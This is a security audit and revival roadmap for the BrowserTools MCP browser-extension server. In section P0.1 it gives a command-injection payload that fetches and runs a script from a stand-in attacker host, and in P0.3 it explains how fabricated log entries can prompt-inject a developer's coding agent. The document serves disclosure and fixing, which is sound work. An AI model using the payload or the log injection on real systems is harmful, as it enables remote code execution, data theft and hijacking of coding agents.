@@ -1,0 +1,260 @@
+# BrowserTools MCP — Revival Roadmap
+
+_Audit date: 2026-07-30. Based on a full review of all 21 open PRs, 8 open issues, ~160 closed issues, all source files, and the current dependency/MCP-protocol landscape._
+
+---
+
+## Status: implemented on branch `revival/v2`
+
+Everything in P0-P4 below is built and tested. 193 tests pass — unit,
+integration, and an end-to-end suite that loads the real extension into a real
+Chromium. `npm audit` reports zero vulnerabilities, down from 22.
+
+See [CHANGELOG.md](CHANGELOG.md) for what shipped, [MIGRATION.md](MIGRATION.md)
+for the upgrade path, [SECURITY.md](SECURITY.md) for the vulnerability writeups,
+and [docs/TRIAGE.md](docs/TRIAGE.md) for the disposition of every open PR and
+issue.
+
+**Deliberately left for a maintainer to do**, because they are outward-facing
+and irreversible:
+
+| Task | Why it is not automated |
+| --- | --- |
+| Publish 2.0.0 to npm | Publishing is a release decision |
+| `npm deprecate` the 1.2.x range | Affects everyone currently installing |
+| Publish the security advisory and request the CVE (#232 asked for one) | Public disclosure |
+| Close the PRs and issues listed in `docs/TRIAGE.md` | Commenting on a public repo with 7k stars |
+| Validate `server.json` with `mcp-publisher validate` and publish to the MCP registry | Needs the registry's GitHub auth flow |
+| Publish the extension to the Chrome Web Store | Requires a developer account |
+
+The rest of this document is the original audit, kept as the record of why each
+change was made.
+
+---
+
+## Where things actually stand
+
+The last code commit was **2025-03-11**. npm still serves **1.2.1** for both packages (the repo says 1.2.0 — the published artifact does not match `main`, so anyone debugging from source is reading different code than they're running). `README.md` line 1 currently reads "THIS PROJECT IS NO LONGER ACTIVE PLEASE USE A DIFFERENT SOLUTION FOR THIS."
+
+Two things came out of the audit that change the priority order:
+
+**1. There is a live, unauthenticated remote code execution vulnerability in the published package.** Not theoretical — the full chain is verified below. It is publicly reported in issues #224, #232, and #233 (one filed with a CVSS 9.8 rating), and it has been sitting open and unpatched.
+
+**2. The original thesis was right, and it still has an opening.** Every major lab converged on browser-extension attach in the last twelve months (Claude for Chrome, OpenAI replacing Atlas with an extension, Gemini in Chrome). Meanwhile Chrome 136+ blocks remote debugging on the default profile entirely, so the CDP-based competitors (Chrome DevTools MCP, Playwright MCP) **cannot attach to the profile that holds your real logins** — the #1 open complaint against them. And neither offers Lighthouse-grade performance/accessibility telemetry. The lane that is still open is *real-session, DevTools-grade telemetry and audits for non-Claude clients* (Cursor, Gemini CLI, local models). The sober counterpoint: the closest analog, `hangwin/mcp-chrome`, stalled in exactly this lane with 226 open issues, which says something about solo maintenance against platform owners.
+
+---
+
+## P0 — Security: do this before anything else (days, not weeks)
+
+These are in shipped code that ~6k people/week still install. This work is independent of any rewrite decision.
+
+### P0.1 — Remote code execution via the WebSocket endpoint
+
+Verified chain:
+
+| Step | Location | Problem |
+|---|---|---|
+| Bind | `browser-tools-server/browser-connector.ts:166` | `serverHost: process.env.SERVER_HOST \|\| "0.0.0.0"` — binds **all network interfaces**, not loopback. The startup banner even prints every IP it's reachable on. |
+| CORS | `browser-connector.ts:246` | `app.use(cors())` — wildcard origin, preflights answered, so cross-origin reads succeed. |
+| WS auth | `browser-connector.ts:648-656` | Upgrade handler checks only that the path is `/extension-ws`. **No origin check, no authentication.** Anything can impersonate the extension. |
+| Sink | `browser-connector.ts:1078` → `:1210` | An attacker-supplied `path` is interpolated into an AppleScript string at `set imagePath to "${fullPath}"`, which is then run via `` exec(`osascript -e '${appleScript}'`) `` — inside shell single quotes. One apostrophe escapes to arbitrary shell. |
+
+Any web page the user visits, or anyone on the same Wi-Fi, can open `ws://127.0.0.1:3025/extension-ws`, send `{type:"screenshot-data", path:"/tmp/x'$(curl attacker.sh|sh)'", autoPaste:true}` and get shell execution as the user. Note `autoPaste` is read straight off the wire, so the "user must have enabled auto-paste" mitigation does **not** apply to this path.
+
+**Fix:** bind `127.0.0.1`; replace `exec` with `execFile("osascript", ["-e", script])`; sandbox screenshot writes under a fixed directory and stop accepting caller-supplied paths; origin-allowlist both CORS and the WS upgrade; add a random per-run token that the extension and MCP server read from a file.
+
+### P0.2 — The extension LAN-scans and will adopt an attacker's server
+
+`chrome-extension/panel.js:684-700` probes `192.168.0.1-5`, `192.168.1.1-5`, `10.0.0.1-5`, `10.0.1.1-5` across ports 3025-3035. At `panel.js:604-610`, the first host returning the signature `mcp-browser-connector-24x7` is written to `settings.serverHost` and **persisted via `saveSettings()`**.
+
+That signature is a hardcoded constant in a public repo — it is an identifier, not a credential. Anyone on shared Wi-Fi can run a 40-line server returning that JSON, and the developer's extension will silently adopt it and stream console logs, full XHR request/response bodies, and screenshots to them, persistently across restarts.
+
+**Fix:** delete the LAN scan entirely. Loopback only.
+
+### P0.3 — Unauthenticated data exfiltration surface
+
+With no auth and wildcard CORS, any visited page can also: read `/console-logs`, `/network-success` (**full request/response bodies and headers — session cookies, `Authorization` headers, API responses**), `/selected-element`, `/current-url`; force a screenshot via `POST /capture-screenshot`; write arbitrary bytes to arbitrary directories via `POST /screenshot`; overwrite global settings via `POST /extension-log` (which merges *any* keys from the request body at `:355-361`); wipe logs; and spawn headless Chrome per request against internal URLs (SSRF + resource exhaustion).
+
+`POST /extension-log` also lets an attacker **inject fabricated log entries that the developer's AI agent will then read and act on** — prompt injection straight into the coding assistant.
+
+**Fix:** the token + loopback + origin checks above cover most of this. Additionally: allowlist which keys `currentSettings` accepts, and add a redaction pass for `Authorization`/`Cookie`/`Set-Cookie` headers and common secret patterns before anything is stored (this also resolves most of issue #228).
+
+### P0.4 — Publish and disclose
+
+1. Ship the fixes as **1.3.0** on npm and `npm deprecate` the vulnerable 1.2.x range with a pointer to the fix.
+2. Publish a GitHub Security Advisory and request the CVE that #232 asks for.
+3. Respond on #224 / #232 / #233 and close #233 as a duplicate of #224.
+4. Replace the README "no longer active" banner with the revival notice.
+
+**If you decide _not_ to revive:** P0.4 still applies. Deprecating the packages is the responsible minimum given what's in them.
+
+---
+
+## P1 — Make it actually work (the reason users churned)
+
+Mined from ~160 closed issues, 108 of which were closed as `NOT_PLANNED` — abandoned, not resolved. Issue volume collapsed from 68/month (Mar 2025) to ~2/month by mid-2025.
+
+### P1.1 — Kill the three-process setup — 29 issues, 149 comments
+
+The single largest support sink. Users don't know they must run `npx @agentdeskai/browser-tools-server` in a second terminal, because the README shows Cursor's green checkmark *before* the server step. In ~70% of these threads the fix was literally "start the other process."
+
+**Fix:** merge the connector into the MCP server process — stdio for the agent, a loopback listener for the extension. This deletes the entire discovery subsystem, which is simultaneously the largest source of complexity, the root of P0.2, and the top support burden. This is the highest-leverage change in the whole roadmap.
+
+### P1.2 — Fix the stdio contract — same-day fix, resolves issues #239, #103, #183, #159
+
+`mcp-server.ts` calls `console.log` (→ **stdout**) at lines 59, 75, 76, 82, 94 inside `discoverServer()`. There *is* a stdout guard, but it's installed at line 1446 — **after** `await discoverServer()` at 1432. So up to ~36 plain-text lines are written into the JSON-RPC stream before the transport connects, and strict clients fail the session.
+
+The guard itself is also a bad pattern: it silently drops any string not starting with `{`, ignores `Buffer` writes entirely, and would corrupt legitimate multi-chunk writes. Replace it with a real stderr logger rather than relocating it.
+
+Startup is also **blocking for up to 33 seconds** (3 hosts × 11 ports × 1s timeout, sequential) before the handshake — a significant chunk of the "Client Closed / no tools found" reports (19 issues, 113 comments). The host list also contains `127.0.0.1` twice (`mcp-server.ts:60`).
+
+### P1.3 — Fix screenshots — 16 issues, 66 comments
+
+- `devtools.js:970` calls `captureVisibleTab(null, ...)` = *current window*. With DevTools undocked, that's DevTools itself → `Cannot access contents of url "devtools://devtools/"`. Community-diagnosed years ago, never fixed. Use `chrome.devtools.inspectedWindow.tabId` explicitly.
+- `browser-connector.ts:718-728` resolves screenshot promises by taking `callbacks[0]` and clearing the map, **ignoring the `requestId`** it generated and the extension echoed back. Two concurrent screenshots cross-talk; one hangs until timeout.
+- The tool returns only the string `"Successfully saved screenshot"` — **the image never reaches the model**. This is what the whole AppleScript-paste-into-Cursor contraption exists to work around. Returning an MCP image content block deletes ~200 lines *including the RCE vector*.
+
+### P1.4 — Fix the extension↔server connection — 22 issues, 86 comments
+
+- MV3 service worker eviction while `devtools.js` holds a `chrome.runtime.sendMessage` callback → the canonical "Receiving end does not exist."
+- `devtools.js:34` assigns `settings = message.settings` and *then* compares `message.settings.serverHost !== settings.serverHost` — always false. **Changing host/port in the panel never reconnects.**
+- Heartbeat is one-way: the extension sends one every 30s, the server never replies and logs `Unhandled message type` — so dead connections are never detected.
+- `browser-connector.ts:661` unconditionally overwrites `activeConnection`, so a second DevTools window silently steals the slot (this is the root of "console logs empty but network logs work").
+
+### P1.5 — Get off the Cursor-on-macOS happy path — ~20 issues
+
+Node <18 → `fetch is not defined`; `spawn npx ENOENT` on Windows (needs `cmd /c`); WSL/remote-SSH loopback splits; nvm/asdf pointing at old Node. Add an `engines` field (neither package has one), an explicit Node version check with a readable error, a tested launch matrix per OS/host, and a `doctor` command that reports which component is missing. Roughly 20 closed issues were pure environment friction a preflight check would have answered without a human.
+
+---
+
+## P2 — Architecture: rewrite, but a targeted one
+
+**Verdict: a rewrite is justified — for architectural reasons, not code rot.** The security model isn't a bug list, it's an *absence*: there is no trust boundary anywhere, and retrofitting one means changing the discovery protocol, the extension, and the server together. That *is* the rewrite. Scope it as: three processes → two, typed boundaries, images as content blocks.
+
+**Keep and port (this is the real domain value):**
+- The **Lighthouse report reshaping** in `lighthouse/{accessibility,performance,seo,best-practices}.ts` — condensing multi-MB LHR output into something an agent can consume, with impact-tiered detail limits. Factor out the shared scaffolding (`DETAIL_LIMITS` is copy-pasted verbatim four times).
+- The **CDP capture approach** in `devtools.js:479-646` — `Runtime.consoleAPICalled` plus `devtools.network.onRequestFinished` with body capture is the right mechanism.
+- The **payload-shaping policies** (recursive truncation, size accounting, header toggles) — sound ideas, but move them server-side and rewrite the implementation.
+- `convertPathForCurrentPlatform` — ugly, but encodes real Windows/WSL knowledge.
+
+**Delete:** 3 screenshot implementations collapse to 1 (one is already dead code at `browser-connector.ts:815-891`); 3 URL-update paths; 2 divergent discovery implementations; the ~700-line hardcoded Next.js prompt that is *half of `mcp-server.ts`* (make it a resource or drop it); the `allXhr` array that's declared and cleared but never written; unused deps (`llm-cost`, `node-fetch`, and in `browser-tools-mcp`: `express`, `cors`, `body-parser`, `ws` — it only makes `fetch` calls).
+
+Also fix while in there: `truncateLogsToQueryLimit` (`:314-341`) returns the **oldest** logs and hard-`break`s on the first oversized entry, so one big early log blocks everything after it — it should walk newest-first. And log caps are client-settable and unbounded (`logLimit: 1e9` + 50MB body limit = memory DoS).
+
+---
+
+## P3 — Protocol and dependency modernization
+
+You are pinned at `@modelcontextprotocol/sdk ^1.4.1` (resolving to 1.5.0). Latest is **1.30.0**. Spec has moved `2024-11-05 → 2025-03-26 → 2025-06-18 → 2025-11-25 → 2026-07-28`.
+
+**Target SDK 1.30.0**, not the brand-new v2.0.0 (published three days ago under new package names, implementing a stateless rewrite). 1.30 speaks spec 2025-11-25 and is supported with fixes for at least six more months. Revisit v2 once it settles; a codemod exists.
+
+Adopt, in order of value:
+1. **Structured tool output** (`outputSchema` + `structuredContent`) — the biggest win here. Console logs, network entries, and Lighthouse metrics are inherently structured and are currently flattened to prose.
+2. **Resource links** (`type: "resource_link"`) — return HAR files, traces, and full Lighthouse reports as links instead of inlining megabytes. Directly addresses the token-bloat complaint that is endemic to this whole product category.
+3. **`registerTool` + tool annotations** (`readOnlyHint` on every reader, `destructiveHint` on `wipeLogs`) — near-zero cost, materially better client UX and auto-approval. This is PR #219's idea, done properly.
+4. **Streamable HTTP transport** if you expose an HTTP surface — SSE is formally deprecated with a 12-month removal window.
+5. **Registry publishing** (`server.json` + `mcp-publisher`) for discoverability.
+6. Progress notifications for long captures and audits.
+
+### Dependencies
+
+`npm audit`: **7 vulnerabilities in browser-tools-mcp** (1 critical, 4 high), **15 in browser-tools-server** (2 critical, 6 high). All have fixes available.
+
+| Package | Current | Latest | Action |
+|---|---|---|---|
+| `@modelcontextprotocol/sdk` | 1.5.0 | 1.30.0 | **Direct high advisory** (DNS rebinding not on by default, ReDoS) |
+| `ws` | 8.18.0 | 8.21.1 | **Direct high advisory** (memory disclosure, DoS) |
+| `express` | 4.21.2 | 5.2.1 | **Direct high** chain; check wildcard route syntax on migration |
+| `body-parser` | 1.20.3 | — | **Delete** — Express has shipped `express.json()` since 4.16; clears a moderate advisory |
+| `node-fetch` | 2.7.0 | — | **Delete** — global `fetch` is stable in Node 18+ |
+| `lighthouse` | 11.7.1 | 13.4.1 | 2 majors; clears the low-severity cluster; needs Node ≥22.19 |
+| `puppeteer-core` | 22.15.0 | 25.4.0 | 3 majors; needs Node ≥22.12 |
+| `typescript` | 5.7.3 | 5.9.3 | Pin to 5.9.3 — `latest` now resolves to TS 7 (the native port), a much bigger change than the number suggests |
+
+Critical transitive advisories: `form-data` (unsafe random boundary, CRLF injection), `basic-ftp` (path traversal). Plus high-severity `lodash`, `tar-fs`, `path-to-regexp`.
+
+**Node floor: `>=22.19`** (forced by lighthouse 13), recommend targeting Node 24 (active LTS through 2028-04). Node 20 went EOL April 2026. **Neither package declares `engines`** — for an `npx`-distributed CLI that's a real gap, since users on EOL Node get confusing runtime failures instead of a clean install error.
+
+---
+
+## P4 — Capabilities that win the lane
+
+Ordered by differentiation value, drawing on the most-requested features and the competitive gaps:
+
+1. **Screenshots into model context** (#200, #52, #181, #111) — PR #194 does this in 7 lines. Ship it.
+2. **Log filtering + pagination** (#205) — PR #218's idea. Keyword filters plus a `limit` param; network logs regularly blow the context window.
+3. **Cookies / localStorage / sessionStorage** — PR #49, the best-engineered PR in the queue, with a privacy gate defaulting to hide-all.
+4. **Tool selection/filtering** (#71) — PR #72's idea; 14 tools is a lot of context to spend.
+5. **Basic interaction** (#99, #196, #57) — click/navigate/refresh. PR #185 does refresh. Deliberately stay minimal here; full automation is lost to Playwright MCP and the first parties.
+6. **Firefox support** (#115) — PR #215, if you want the surface area.
+7. **Secret redaction** — table stakes given what this captures, and a genuine differentiator versus competitors that dump raw headers.
+
+---
+
+## Testing strategy
+
+Currently **zero tests, zero CI** — confirmed. Build in four tiers, cheapest first:
+
+**Tier 1 — pure functions, no browser.** The Lighthouse extractors are pure `(LighthouseResult, url) => Report`. Capture a few real LHR blobs as fixtures and snapshot-test them, plus table-driven tests for `truncateStringsInData`, `truncateLogsToQueryLimit` (immediately pins the newest-logs-dropped bug), and `convertPathForCurrentPlatform` across win32/darwin/linux/WSL. Needs only `vitest`.
+
+**Tier 2 — connector server, no browser.** Refactor the module-level `app`/`listen` IIFE into `createServer(config)` so tests can bind port 0. Then `supertest` for the HTTP surface, plus a **fake extension** (a plain `ws` client that answers `take-screenshot` with a 1×1 PNG) to exercise the whole screenshot path — fire two concurrent requests and the `requestId` bug falls out immediately. Add **security regression tests**: assert the listener is on `127.0.0.1`, assert `Access-Control-Allow-Origin` is not `*`, assert unknown settings keys are rejected, assert a path containing `'` never reaches a shell.
+
+**Tier 3 — MCP protocol conformance.** Spawn the built server against a stubbed connector and speak JSON-RPC over stdio. Critically: **assert stdout contains only JSON-RPC frames** — that's the permanent regression test for P1.2.
+
+**Tier 4 — real E2E with the extension loaded** (what you asked about — feasible, but this is the fiddly part). Playwright `chromium.launchPersistentContext` with `--load-extension` and `--auto-open-devtools-for-tabs`. MV3 needs `--headless=new` or headed-under-Xvfb; old headless will not load extensions. The wrinkle is that the logic lives in a **DevTools page**, which no framework drives natively — you attach to the `devtools://` target via CDP and `evaluate` inside the frontend to open the panel, which is what triggers the capture path. Serve fixture pages emitting deterministic markers, then poll the test connector's `/console-logs` until they appear.
+
+For this to not be flaky, the 5s WS reconnect, 30s panel reconnect, and 25s URL poll all need to be config-injectable — worth designing for in the P2 rewrite.
+
+**Practical sequencing:** Tiers 1-3 catch nearly every bug listed in this document, need no browser, and run in seconds. Tier 4 is worth exactly **one** smoke test (page loads → console log arrives → screenshot saves), because that contract is the one thing no unit test can pin down.
+
+---
+
+## PR disposition — all 21
+
+**Merge (2):**
+
+| PR | What | Why |
+|---|---|---|
+| **#235** | Keep MCP stdio logs off stdout | Best of three fixes for the same bug — also moves the stdout guard before discovery. Merge this one first; 8 of 11 recent PRs touch `mcp-server.ts` and will conflict. |
+| **#194** | Screenshot as image in MCP response | 7 lines, correct, high value. Merge after #235. |
+
+**Also mergeable, trivial (2):** #137 (one-line fix so `stringSizeLimit` actually applies — cheapest win in the queue), #150 (delete committed `.DS_Store`; add the `.gitignore` entry yourself).
+
+**Reimplement — good idea, flawed code (8):** #49 (cookies/storage — best-engineered of the lot; merge as-is if you accept the privacy surface), #219 (tool annotations — redo on a current SDK, don't take the 1000-line lockfile diff), #218 (keyword filters — filters crash on undefined fields), #72 (tool selection — its logging would corrupt the MCP stream, the exact bug #235 fixes), #85 (undocked-DevTools screenshots — right diagnosis, messy dual-path), #178 (Chromium support — ~20 useful lines inside an 800-line reformat), #215 (Firefox — solid work, but three PRs in one; ask the author to split), #185/#236/#237 (minor; #236 and #237 are from bot accounts, see below).
+
+**Close (7):**
+- **#203, #167, #176** — marketing/link injection. #203 and #167 are the same MseeP.ai badge from the same author, filed twice; the author has 5,424 public repos and files this across hundreds of MCP repos. #176 is the deepnlp.org campaign. In both cases the badge image is remotely hosted, so it functions as a **tracking pixel firing on every README view**, and the "security findings" in the PR bodies are boilerplate used to add legitimacy.
+- **#223, #222** — byte-identical diffs to each other and strict subsets of #235. (#222 has the best root-cause writeup of the three if you want to credit it.)
+- **#187** — auto-spawns a detached server process from the MCP server, breaks the single-WebSocket model, announces a fictitious "v1.3.0" in the README, and ships the author's personal Windows paths. Its two good ideas (configurable screenshot path, capture with DevTools closed) are worth reimplementing separately.
+- **#73** — 17 months stale, conflicting, and imposes pnpm/husky/single-quotes. You'll pick your own tooling in the rewrite.
+
+**Bot accounts:** `xianzuyang9-blip` (#237) and `wer416182-afk` (#236) match the auto-generated-username pattern (created 2025-10 and 2026-01, no names, high repo churn, `codex/` branch prefixes). Their diffs are content-clean and the ideas are fine — just reimplement rather than merge.
+
+## Issue disposition — all 8
+
+| # | Action |
+|---|---|
+| **#224** | **Fix — P0.** Canonical RCE tracker. |
+| **#232** | Duplicate of #224; respond re: the CVE request. |
+| **#233** | Close as duplicate of #224 (vendor scan with marketing link). |
+| **#239** | **Fix — P1.2.** Real, and a 3-line fix. |
+| **#226** | **Fix — P1.1/P1.2.** Discovery failure; keep open as the tracking issue since the underlying bug is unfixed. |
+| **#228** | Fix selectively — header redaction and secret scrubbing are cheap wins; close the trivial sub-items. |
+| **#225** | Close — misfiled, the stack trace is entirely `@bytebase/dbhub`. |
+| **#234** | Close — vendor promotion, findings behind a signup wall. |
+
+---
+
+## Suggested sequence
+
+| Phase | Work | Rough shape |
+|---|---|---|
+| **0** | P0 security fixes → ship 1.3.0 → deprecate 1.2.x → advisory + CVE → README banner | Days. Do not wait on anything else. |
+| **1** | Merge #235, #194, #137, #150. Close the 7. Triage-respond to the rest. | An afternoon; clears the queue and signals the project is alive. |
+| **2** | P1.2 stdio + non-blocking discovery, P1.3 screenshots, P1.4 connection fixes. Tiers 1-3 tests + CI alongside. | The "make it work again" release. |
+| **3** | P2 rewrite: three processes → two, typed boundaries, images as content blocks. Tier 4 smoke test. | The structural one. Removes discovery entirely. |
+| **4** | P3 SDK 1.30 + structured output + resource links + dependency/Node bumps. | Modernization. |
+| **5** | P4 capabilities, prioritizing screenshots-in-context, filtering/pagination, and redaction. | Differentiation. |
+
+Phases 0 and 1 are worth doing **regardless** of whether you commit to the full revival — they close a live vulnerability and cost very little. The decision point that actually matters is phase 3, since that's where the real time goes.
